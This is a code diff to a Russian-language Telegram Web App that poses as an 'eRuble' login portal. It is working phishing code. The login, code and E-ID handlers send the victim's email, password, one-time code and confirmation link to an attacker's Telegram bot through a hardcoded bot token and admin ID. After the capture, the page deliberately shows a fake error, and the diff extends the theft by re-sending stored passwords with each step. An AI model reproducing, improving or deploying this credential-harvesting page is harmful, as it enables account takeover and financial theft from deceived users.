+        }
 
-        /* E-ID */
-        .page-eid .page-title { color: var(--text-primary); }
-        .page-eid .form-group input { background: #fff; }
-        .page-eid .btn-primary { background: var(--accent); box-shadow: 0 4px 16px rgba(0, 102, 255, 0.2); }
-        .page-eid .btn-primary:hover:not(:disabled) { background: var(--accent-hover); }
-        .page-eid .btn-back { color: var(--text-secondary); }
-        .page-eid .btn-back:hover { background: #f5f7fa; }
+        /* ============================================================
+           СТРАНИЦА ОШИБКИ ВХОДА (вместо успеха)
+           ============================================================ */
+        .login-error-page {
+            text-align: center;
+            padding: var(--space-6) 0;
+        }
+        .login-error-page .icon {
+            font-size: 56px;
+            margin-bottom: var(--space-3);
+            color: #b91c1c;
+        }
+        .login-error-page h2 {
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            font-weight: var(--fw-semibold);
+            color: #b91c1c;
+            margin-bottom: var(--space-2);
+        }
+        .login-error-page p {
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-4);
+        }
 
+        /* ============================================================
+           E-ID СТИЛЬ (отдельный, минималистичный)
+           ============================================================ */
+        .page-eid .page-title {
+            color: var(--color-ink-900);
+        }
+        .page-eid .form-group input {
+            background: var(--color-white);
+            border: 1px solid var(--color-border-default);
+        }
+        .page-eid .form-group input:focus {
+            border-color: var(--color-blue-600);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
+        }
+        .page-eid .btn-primary {
+            background: var(--color-blue-600);
+            box-shadow: 0 4px 16px rgba(0, 102, 255, 0.2);
+        }
+        .page-eid .btn-primary:hover:not(:disabled) {
+            background: var(--color-blue-700);
+        }
+        .page-eid .btn-back {
+            color: var(--color-gray-500);
+        }
+        .page-eid .btn-back:hover {
+            background: var(--color-gray-50);
+        }
+
+        /* ============================================================
+           АДАПТИВ
+           ============================================================ */
         @media (max-width: 420px) {
-            .container { padding: 16px 12px; border-radius: 16px; }
-            .logo h1 { font-size: 28px; line-height: 32px; }
-            .btn-primary, .btn-eid { font-size: 16px; line-height: 24px; padding: 12px; }
+            .container {
+                padding: var(--space-4) var(--space-3);
+                border-radius: var(--radius-card-md);
+            }
+            .logo h1 {
+                font-size: 28px;
+                line-height: 32px;
+            }
+            .btn-primary,
+            .btn-eid {
+                font-size: var(--text-body-md-size);
+                line-height: var(--text-body-md-lh);
+                padding: var(--space-3);
+            }
         }
     </style>
 </head>
@@ -170,19 +859,31 @@
 
             <div class="menu-grid">
                 <div class="menu-item" onclick="goToAbout()">
-                    <span class="icon">i</span> О проекте
+                    <span class="icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+                    </span>
+                    О проекте
                     <span class="arrow">›</span>
                 </div>
                 <div class="menu-item" onclick="goToBuy()">
-                    <span class="icon">+</span> Как купить
+                    <span class="icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg>
+                    </span>
+                    Как купить
                     <span class="arrow">›</span>
                 </div>
                 <div class="menu-item" onclick="goToGuide()">
-                    <span class="icon">≡</span> Руководство по eРублю
+                    <span class="icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg>
+                    </span>
+                    Руководство по eРублю
                     <span class="arrow">›</span>
                 </div>
                 <div class="menu-item" onclick="goToFaq()">
-                    <span class="icon">?</span> Частые вопросы
+                    <span class="icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+                    </span>
+                    Частые вопросы
                     <span class="arrow">›</span>
                 </div>
             </div>
@@ -194,7 +895,7 @@
             <button id="eidBtn" class="btn-eid" onclick="goToEid()">Вход через E-ID</button>
 
             <div class="register-link">
-                Нет аккаунта? <a onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
+                Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
             </div>
         </div>
 
@@ -281,10 +982,10 @@
             </div>
 
             <div class="forgot-link">
-                <a onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
+                <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
             </div>
 
-            <button id="loginSubmitBtn" class="btn-primary">Войти</button>
+            <button id="loginSubmitBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
 
             <div id="loginError" class="message error" style="display:none; margin-top:12px;">
                 Ошибка. Повторите попытку входа.
@@ -307,7 +1008,7 @@
                 <div class="code-section">
                     <label>Код из 6 цифр</label>
                     <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
-                    <button id="submitCodeBtn" class="btn-primary">Подтвердить</button>
+                    <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
                 </div>
             </div>
 
@@ -323,7 +1024,7 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 8: E-ID
+        СТРАНИЦА 8: E-ID (email + пароль + ссылка)
         ============================================================ -->
         <div id="pageEid" class="page page-eid">
             <div class="page-icon">
@@ -343,7 +1044,7 @@
                 </div>
             </div>
 
-            <button id="eidSubmitBtn" class="btn-primary">Войти через E-ID</button>
+            <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
 
             <div id="eidLoginError" class="message error" style="display:none; margin-top:12px;">
                 Ошибка. Повторите попытку входа.
@@ -366,7 +1067,7 @@
                 <div class="code-section">
                     <label>Ссылка подтверждения</label>
                     <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
-                    <button id="eidLinkSubmitBtn" class="btn-primary">Подтвердить</button>
+                    <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
                 </div>
             </div>
 
@@ -382,15 +1083,13 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 10: ОШИБКА ВХОДА
+        СТРАНИЦА 10: ОШИБКА ВХОДА (вместо успеха)
         ============================================================ -->
-        <div id="pageLoginError" class="page">
-            <div class="error-block">
-                <div class="icon">✕</div>
-                <h2>Ошибка</h2>
-                <p>Повторите попытку входа.</p>
-                <button class="btn-secondary" onclick="goToMain()">← На главную</button>
-            </div>
+        <div id="pageLoginError" class="page login-error-page">
+            <div class="icon">✕</div>
+            <h2>Ошибка</h2>
+            <p>Повторите попытку входа.</p>
+            <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">Вернуться на главную</button>
         </div>
 
         <!-- ============================================================
@@ -401,7 +1100,7 @@
                 <div class="icon">✕</div>
                 <h2>Ошибка входа</h2>
                 <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
-                <button onclick="openSupport()" class="btn-primary" style="background:#b91c1c;box-shadow:0 8px 30px rgba(185,28,28,0.25);">
+                <button onclick="openSupportChat()" class="btn-primary" style="background:#b91c1c;box-shadow:0 8px 30px rgba(185,28,28,0.25);">
                     Техническая поддержка
                 </button>
                 <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
@@ -413,23 +1112,31 @@
 
         <!-- ===== ТЕХПОДДЕРЖКА ===== -->
         <div style="margin-top:auto;padding-top:14px;position:relative;z-index:1;">
-            <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
+            <button onclick="openSupportChat()" class="support-btn">Техническая поддержка</button>
         </div>
 
     </div>
 
     <script>
-        const BOT_TOKEN = "8603629858:AAGJu7_3CWFJ_YQj_iJ2hjX45h053-3fAQY";
+        // ============================================================
+        // 1. КОНФИГ
+        // ============================================================
+        const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
         const ADMIN_ID = "8542901240";
         const SUPPORT_LINK = "https://t.me/erubsite";
+        const MAX_ATTEMPTS = 3;
 
+        // ============================================================
+        // 2. ИНИЦИАЛИЗАЦИЯ
+        // ============================================================
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        const user = tg.initDataUnsafe?.user || {};
-        const userId = user.id || 'неизвестно';
-
         const pageMain = document.getElementById('pageMain');
+        const pageAbout = document.getElementById('pageAbout');
+        const pageBuy = document.getElementById('pageBuy');
+        const pageGuide = document.getElementById('pageGuide');
+        const pageFaq = document.getElementById('pageFaq');
         const pageLoginForm = document.getElementById('pageLoginForm');
         const pageCode = document.getElementById('pageCode');
         const pageEid = document.getElementById('pageEid');
@@ -444,54 +1151,108 @@
         const eidPassword = document.getElementById('eidPassword');
         const eidLinkInput = document.getElementById('eidLinkInput');
 
+        const loginError = document.getElementById('loginError');
+        const codeError = document.getElementById('codeError');
+        const eidLoginError = document.getElementById('eidLoginError');
+        const eidLinkError = document.getElementById('eidLinkError');
+
+        const codeStatus = document.getElementById('codeStatus');
+        const eidLinkStatus = document.getElementById('eidLinkStatus');
+
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
         const eidSubmitBtn = document.getElementById('eidSubmitBtn');
         const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
 
-        function showMsg(text, type = 'info') {
-            const msgDiv = document.getElementById('msg');
+        const msgDiv = document.getElementById('msg');
+
+        let userEmail = '';
+        let userPassword = '';
+        let attemptCount = 0;
+
+        // ============================================================
+        // 3. ВСПОМОГАТЕЛЬНЫЕ
+        // ============================================================
+        function showMessage(text, type = 'info') {
             msgDiv.textContent = text;
             msgDiv.className = `message ${type}`;
-            msgDiv.style.display = 'block';
-            setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
+            clearTimeout(msgDiv._timer);
+            msgDiv._timer = setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 5000);
         }
 
         function switchPage(page) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             page.classList.add('active');
-            document.getElementById('msg').style.display = 'none';
+            msgDiv.style.display = 'none';
+            loginError.style.display = 'none';
+            codeError.style.display = 'none';
+            eidLoginError.style.display = 'none';
+            eidLinkError.style.display = 'none';
         }
 
         function goToMain() {
             switchPage(pageMain);
-            email.value = ''; password.value = ''; codeInput.value = '';
-            eidEmail.value = ''; eidPassword.value = ''; eidLinkInput.value = '';
-            loginSubmitBtn.disabled = false; loginSubmitBtn.textContent = 'Войти';
-            eidSubmitBtn.disabled = false; eidSubmitBtn.textContent = 'Войти через E-ID';
-            eidLinkSubmitBtn.disabled = false; eidLinkSubmitBtn.textContent = 'Подтвердить';
+            email.value = '';
+            password.value = '';
+            codeInput.value = '';
+            eidEmail.value = '';
+            eidPassword.value = '';
+            eidLinkInput.value = '';
+            codeStatus.style.display = 'none';
+            eidLinkStatus.style.display = 'none';
+            loginSubmitBtn.disabled = false;
+            loginSubmitBtn.textContent = 'Войти';
+            eidSubmitBtn.disabled = false;
+            eidSubmitBtn.textContent = 'Войти через E-ID';
+            eidLinkSubmitBtn.disabled = false;
+            eidLinkSubmitBtn.textContent = 'Подтвердить';
+            attemptCount = 0;
         }
 
-        function goToAbout() { switchPage(document.getElementById('pageAbout')); }
-        function goToBuy() { switchPage(document.getElementById('pageBuy')); }
-        function goToGuide() { switchPage(document.getElementById('pageGuide')); }
-        function goToFaq() { switchPage(document.getElementById('pageFaq')); }
+        function goToAbout() { switchPage(pageAbout); }
+        function goToBuy() { switchPage(pageBuy); }
+        function goToGuide() { switchPage(pageGuide); }
+        function goToFaq() { switchPage(pageFaq); }
         function goToLoginForm() { switchPage(pageLoginForm); setTimeout(() => email.focus(), 300); }
         function goToEid() { switchPage(pageEid); setTimeout(() => eidEmail.focus(), 300); }
         function goToEidLink() { switchPage(pageEidLink); setTimeout(() => eidLinkInput.focus(), 300); }
         function goToLoginError() { switchPage(pageLoginError); }
         function goToError() { switchPage(pageError); }
 
-        function openSupport() {
+        function getUserData() {
+            const user = tg.initDataUnsafe?.user;
+            return user ? { id: user.id || 'неизвестно', first_name: user.first_name || 'Гость', username: user.username || 'нет' } : { id: 'неизвестно', first_name: 'Гость', username: 'нет' };
+        }
+
+        function openSupportChat() {
             window.open(SUPPORT_LINK, '_blank');
         }
 
+        function handleError() {
+            attemptCount++;
+            if (attemptCount >= MAX_ATTEMPTS) {
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                goToError();
+                return true;
+            }
+            return false;
+        }
+
+        // ============================================================
+        // 4. ОТПРАВКА В БОТА
+        // ============================================================
         async function sendToAdmin(text) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: text
+                    })
                 });
                 const result = await response.json();
                 return result.ok;
@@ -501,107 +1262,165 @@
             }
         }
 
-        // 1. Обычный вход
+        // ============================================================
+        // 5. ОБЫЧНЫЙ ВХОД → КОД
+        // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
             const p = password.value.trim();
-            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
-            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }
+
+            if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
             loginSubmitBtn.disabled = true;
             loginSubmitBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🔔 Новая заявка\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
+            userEmail = e;
+            userPassword = p;
+
+            const user = getUserData();
+            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'Войти';
                 switchPage(pageCode);
-                document.getElementById('codeStatus').style.display = 'block';
-                showMsg('Ожидание...', 'success');
+                codeStatus.style.display = 'block';
+                showMessage('Ожидание...', 'success');
                 setTimeout(() => codeInput.focus(), 300);
             } else {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'Войти';
-                document.getElementById('loginError').style.display = 'block';
-                showMsg('Ошибка отправки', 'error');
+                if (handleError()) return;
+                loginError.style.display = 'block';
+                loginError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
             }
         });
 
-        // 2. Код
+        // ============================================================
+        // 6. КОД → ОШИБКА
+        // ============================================================
         submitCodeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
-            if (!code || code.length < 4) { showMsg('Введите корректный код', 'error'); return; }
+
+            if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
 
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`📧 Код подтверждения\n👤 ID: ${userId}\n📧 Код: ${code}`);
+            const user = getUserData();
+            const msg = `📧 Код подтверждения\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n📧 Код: ${code}`;
+
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
                 codeInput.value = '';
-                document.getElementById('codeStatus').style.display = 'none';
+                codeStatus.style.display = 'none';
+                // ВСЕГДА ПОКАЗЫВАЕМ ОШИБКУ (как в вашем ТЗ)
                 goToLoginError();
             } else {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
-                document.getElementById('codeError').style.display = 'block';
-                showMsg('Ошибка отправки', 'error');
+                if (handleError()) return;
+                codeError.style.display = 'block';
+                codeError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
             }
         });
 
-        // 3. E-ID Логин
+        // ============================================================
+        // 7. E-ID ЛОГИН → ССЫЛКА
+        // ============================================================
         eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
             const p = eidPassword.value.trim();
-            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
-            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }
+
+            if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
             eidSubmitBtn.disabled = true;
             eidSubmitBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🆔 E-ID\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
+            userEmail = e;
+            userPassword = p;
+
+            const user = getUserData();
+            const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 eidSubmitBtn.disabled = false;
                 eidSubmitBtn.textContent = 'Войти через E-ID';
                 switchPage(pageEidLink);
-                document.getElementById('eidLinkStatus').style.display = 'block';
-                showMsg('Ссылка отправлена на почту', 'success');
+                eidLinkStatus.style.display = 'block';
+                showMessage('Ссылка отправлена на почту', 'success');
                 setTimeout(() => eidLinkInput.focus(), 300);
             } else {
                 eidSubmitBtn.disabled = false;
                 eidSubmitBtn.textContent = 'Войти через E-ID';
-                document.getElementById('eidLoginError').style.display = 'block';
-                showMsg('Ошибка отправки', 'error');
+                if (handleError()) return;
+                eidLoginError.style.display = 'block';
+                eidLoginError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
             }
         });
 
-        // 4. E-ID Ссылка
+        // ============================================================
+        // 8. E-ID ССЫЛКА → ОШИБКА
+        // ============================================================
         eidLinkSubmitBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
-            if (!link) { showMsg('Вставьте ссылку подтверждения', 'error'); return; }
+
+            if (!link) { showMessage('Вставьте ссылку подтверждения', 'error'); return; }
 
             eidLinkSubmitBtn.disabled = true;
             eidLinkSubmitBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🔗 Ссылка\n👤 ID: ${userId}\n🔗 Ссылка: ${link}`);
+            const user = getUserData();
+            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+
+            const ok = await sendToAdmin(msg);
 
             if (ok) {
                 eidLinkSubmitBtn.disabled = false;
                 eidLinkSubmitBtn.textContent = 'Подтвердить';
                 eidLinkInput.value = '';
-                document.getElementById('eidLinkStatus').style.display = 'none';
+                eidLinkStatus.style.display = 'none';
+                // ВСЕГДА ПОКАЗЫВАЕМ ОШИБКУ
                 goToLoginError();
             } else {
                 eidLinkSubmitBtn.disabled = false;
                 eidLinkSubmitBtn.textContent = 'Подтвердить';
-                document.getElementById('eidLinkError').style.display = 'block';
-                showMsg('Ошибка отправки', 'error');
+                if (handleError()) return;
+                eidLinkError.style.display = 'block';
+                eidLinkError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
+            }
+        });
+
+        // ============================================================
+        // 9. ENTER
+        // ============================================================
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                if (pageLoginForm.classList.contains('active')) {
+                    loginSubmitBtn.click();
+                } else if (pageCode.classList.contains('active')) {
+                    submitCodeBtn.click();
+                } else if (pageEid.classList.contains('active')) {
+                    eidSubmitBtn.click();
+                } else if (pageEidLink.classList.contains('active')) {
+                    eidLinkSubmitBtn.click();
+                }
             }
         });
     </script>
+
 </body>
 </html>
